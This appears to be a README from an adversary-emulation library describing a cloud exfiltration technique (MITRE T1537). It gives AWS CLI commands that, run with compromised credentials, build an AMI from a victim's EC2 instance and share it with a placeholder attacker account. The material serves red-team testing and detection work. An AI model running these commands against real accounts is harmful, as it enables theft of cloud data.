# Transfer Data from one cloud account to another

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP is used to create an dummy EC2 instance with unencrypted EBS volume and create an AMI from this instance in AWS. This means your sts-caller-identity must be that of the victim when executing the TTP. The AMI is then exposed to the attacker's AWS account. Finally, it confirms the availability of the AMI from the attacker's account by listing all available AMI(s) that originated from the victim's account. This TTP assumes compromised credentials are used to perform these actions.

## Arguments
### (create_and_expose_unencrypted_ebs)
  - **aws_victim_account_name**: AWS account name of the victim.
  - **role**: Account role to be used when communicating with AWS resources.
  - **instance_name**: Name of the EC2 instance to be created
  - **attacker_account_id**: Attacker's AWS account ID to which the created AMI will be exposed.

## Steps

1. Create an EC2 instance with unencrypted EBS volume.
3. Create an AMI from the EC2 instance with the attached unencrypted EBS volume.
4. Modify the permissions of the created AMI to expose it to the attacker's AWS account.
6. Switch to the attacker's AWS profile.
7. Describe all available images that originated from the victim's account ID.

## Manual Reproduction Steps

Create and attach an unencrypted EBS volume

Refer to //cloud/aws/defense-evasion/create-cloud-instance/README.md

Create an AMI from the instance

AMI_ID=$(aws ec2 create-image --instance-id INSTANCE_ID --name "CompromisedInstanceAMI" --no-reboot --output text)

Modify AMI permissions

aws ec2 modify-image-attribute --image-id $AMI_ID --launch-permission "Add=[{UserId=ATTACKER_ACCOUNT_ID}]"

Switch to attacker profile and check AMI availability

awsume attacker-profile
aws ec2 describe-images --owners VICTIM_ACCOUNT_ID

## MITRE ATT&CK Mapping

- **Tactics**:
   TA0010 Exfiltration
- **Techniques**:
   T1537 Transfer Data to Cloud Account
